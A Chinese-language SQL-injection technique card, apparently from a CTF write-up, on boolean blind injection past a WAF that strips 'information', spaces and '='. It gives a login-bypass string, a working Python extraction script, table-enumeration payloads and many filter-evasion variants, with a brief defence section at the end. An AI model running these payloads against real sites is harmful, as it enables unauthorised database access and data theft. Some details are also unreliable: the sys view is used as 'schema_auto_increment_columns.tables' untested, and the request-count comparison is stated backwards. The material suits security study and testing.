---
id: web-generic-sqli-schema-auto-increment-columns-information-bypass
title: information_schema 被 WAF 过滤时的布尔盲注替代：用 schema_auto_increment_columns.tables 取表名，配合 /**/ 代空格与 like 代等号
type: scenario
domain: web
path: web/generic/sqli
technique: blind-sqli-schema-auto-increment-columns-space-equals-bypass
tags:
- sqli
- blind
- waf-bypass
- mysql
- information-schema
- boolean-oracle
- login-bypass
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W5
  verified_at: '2026-11-08T23:25:02+08:00'
  notes: 已对照原文核对；本次核对未读取图片；盲注模板、前缀 g01den、过滤点 information/空格/等号、用注释代替空格与 like 代替等号、用 schema_auto_increment_columns.tables 取表名均与原文 payload 逐条一致；未验证点：原文仅爆出库名并自述爆破表名时有问题，且该视图属 sys 库视图，未限定库名时能否直接使用未实测
url: /docs/web/generic/sqli/web-generic-sqli-schema-auto-increment-columns-information-bypass/
draft: false
kb_aliases:
- schema_auto_increment_columns 代替 information_schema
- 过滤 information 的盲注
- /**/ 代替空格
- like 代替等号
- ascii(substr()) 布尔盲注
---

## 一句话结论

当后端把登录后的查询参数直接拼进 SQL、且 WAF 只是把 `information`、`=`、空格这类字面子串过滤掉时，布尔盲注仍然可以完整跑起来：用 `/**/` 顶替被删掉的空格、用 `like`（或 `regexp`）顶替 `=`、用 MySQL 自带的 `schema_auto_increment_columns` 视图顶替 `information_schema.tables`，再用 `ascii(substr((select ...),i,1)) like <n>` 一字符一字符地把库名/表名问出来。

## 原理

- **过滤的是子串不是语义**：WAF 若用 `str.replace("information","")`、`preg_replace('/\s|=+/','')` 之类的手段，只会让 SQL 文本变形，而 SQL 有大量等价写法。被删的空格用注释 `/**/` 顶上（MySQL 把 `/**/` 当 token 分隔符），被删的 `=` 用 `like`、`regexp`、`in`、`between` 顶上，被禁的表名换一个同内容的表。
- **`schema_auto_increment_columns` 是现成的字典替身**：MySQL 的 `schema_auto_increment_columns` 视图里带 `table_schema`、`table_name` 两列（只有含自增列的引擎表才出现，`MyISAM`/`InnoDB` 都算），因此 `select table_name from schema_auto_increment_columns where table_schema like database()` 在 `information_schema` 被完全封禁时仍能枚举大部分表；同理 `schema_privileges`、`schema_table_statistics`（MariaDB）、`performance_schema` 里的 `objects_summary_global_by_type` 都能当替代字典。
- **布尔盲注只需要一个可观测差异**：页面正常返回含有固定标记（本例是打卡成功文案），条件为假时页面没有该标记，于是 `ascii(substr(...)) like n` 就是一个真假问句。`like` 在不带 `%`/`_` 时等价于 `=`，`ascii()` 把字符变成 0–127 的数字，`substr(str,i,1)` 定位第 i 个字符，`length()` 先取长度以缩减爆破空间。
- **为什么要先求长度**：`length((select database())) like <n>` 把长度为 n 的问句问一遍即可确定字符串长度，后续只需按位爆破，请求数从 O(字符集) 降到 O(长度×字符集)；长度也用于判断枚举是否越界（`substr` 越界返回空串，`ascii('')` 为 NULL，条件恒假）。

## 触发条件

- 登录后的查询接口把用户输入拼进 SQL（本例是 `select ... where name='<input>'`），存在可区分的真假响应。
- WAF/过滤层只做子串删除或简单正则（过滤了 `information`、`=`、空格等），未使用参数化查询、未部署语义级 SQL 注入检测。
- 数据库为 MySQL/MariaDB（`schema_auto_increment_columns` 存在）；且当前账号对 `information_schema`/`schema_*` 视图有读权限（普通业务账号通常有）。
- 需要先有一个可用账号或万能密码（本例用 `admin' or 1=1#` 一类登录绕过）。

## 利用步骤

1. 先确认注入点与真假差异：`name=g01den'/**/and/**/1=1#` 有标记、`and/**/1=2#` 无标记，即布尔盲注可用（注意该步也要把 `=` 换成 `like`，若 `=` 被拦）。
2. 求库名长度：`g01den'/**/and/**/length((select/**/database()))/**/like/**/<n>#`，从 1 递增到命中。
3. 逐字符求库名：`g01den'/**/and/**/ascii(substr((select/**/database()),<i>,1))/**/like/**/<ascii>#`，遍历 33–126。
4. 求表数量：把 `database()` 换成 `count(*)`、表换成 `schema_auto_increment_columns.tables`；再逐表逐字符枚举表名。
5. 拿到表名后按同样模板换成 `column_name` 来源（`schema_auto_increment_columns` 视图没有列名，需要能落到 `information_schema.columns` 或在拿到表后改用 `union`/报错注入；若 `information` 被删干净，可用 `select * from <table>` 的列数+报错回显、`procedure analyse()`、`extractvalue`/`updatexml` 报错把列名带回）。
6. 取到目标数据后按业务含义登录后台或直接取 flag。

## PoC

布尔盲注取库名（原题可用脚本，仅示意请求形态，不访问目标）：

```python
import requests

url = 'http://TARGET/worker.php'
mark = '打卡成功标记'

def q(payload):
    r = requests.post(url, data={'name': payload})
    return mark in r.text

# 1) 库名长度
for n in range(1, 60):
    if q(f"g01den'/**/and/**/length((select/**/database()))/**/like/**/{n}#"):
        print('len =', n); break

# 2) 逐字符取库名
name = ''
for i in range(1, n + 1):
    for c in range(33, 127):
        if q(f"g01den'/**/and/**/ascii(substr((select/**/database()),{i},1))/**/like/**/{c}#"):
            name += chr(c); break
print(name)
```

表名来源换成视图（`information` 被过滤时的替代字典）：

```sql
g01den'/**/and/**/length((select/**/count(*)/**/from/**/schema_auto_increment_columns.tables/**/where/**/table_schema/**/like/**/database()))/**/like/**/{n}#
```

```sql
g01den'/**/and/**/ascii(substr((select/**/table_name/**/from/**/schema_auto_increment_columns.tables/**/where/**/table_schema/**/like/**/'{db}'),{i},1))/**/like/**/{c}#
```

## 变体与关联

- 替代字典：`information_schema` 系列被过滤时依次尝试 `schema_auto_increment_columns`（表名）、`schema_privileges`、`performance_schema.objects_summary_global_by_type`、`mysql.innodb_table_stats`（8.0 里 `innodb_table_stats` 含 `table_name`，无需 `information` 关键字）。
- 空格替身：`/**/`、`%09`/`%0a`（URL 编码的 tab/换行）、`()`（`select(database())`）、注释 `#`/`-- `；等号替身：`like`、`regexp`、`between a and b`、`in(1)`、`>`/`<`。
- 若 `and`/`or` 被拦：用 `&&`、`||`、`xor`；若 `substr` 被拦：`mid`、`left`、`right`、`insert`；若 `ascii` 被拦：`ord`、`hex` 配合 `like`。
- 关联：[[web-generic-sqli-blind-filter-bypass-functions]]（函数被拦时重建布尔/时间盲注）、[[web-generic-sqli-order-by-union-lexicographic-blind]]（排序位盲注）。

## 检测与防御

- 根因是字符串拼接 SQL；修复只需参数化查询/预编译，与 WAF 规则无关。
- 数据库账号最小权限：业务账号不应能读 `information_schema`/`performance_schema`/`mysql.*`（MySQL 8 可用 `REVOKE` + 视图隔离）。
- 检测：同一接口短时间内大量结构相似的请求（含 `/**/`、`ascii(`、`substr(`、`like`、`length(`）；响应长度/标记位呈 0/1 分布；WAF 命中去空格/去等号的变形特征。
- 不要把「登录成功文案」这类固定标记做成可布尔观察的差异；错误与空结果响应应统一。
